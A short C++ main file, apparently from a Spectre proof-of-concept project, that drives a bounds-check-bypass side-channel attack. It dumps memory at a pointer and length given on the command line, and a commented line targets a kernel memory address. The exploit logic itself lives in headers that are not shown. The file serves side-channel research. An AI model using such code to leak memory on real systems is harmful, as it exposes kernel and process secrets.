#include "common.h"
#include "libflush++.h"
#include "spectre.h"
#include "spectre_meltdown.h"
#include "spectre_direct.h"
#include "spectre_boundcheck.h"
#include "spectre_kernel.h"

#include <string.h>

#ifndef __ANDROID_API__

spectre::DataArrayBoundCheckBypass spectre_instance;

int main(int argc, const char** argv) {
    const char* target_ptr = "Mary had a little lamb";
    int target_len = strlen(target_ptr);

    // target_ptr = 0xffff880000000000 + (const char*)0x1951074b8;

    if (argc == 3) {
        sscanf(argv[1], "%p", &target_ptr);
        sscanf(argv[2], "%d", & target_len);
    }

    spectre_instance.dump((uint8_t*)target_ptr, target_len);
    return 0;
}
#endif
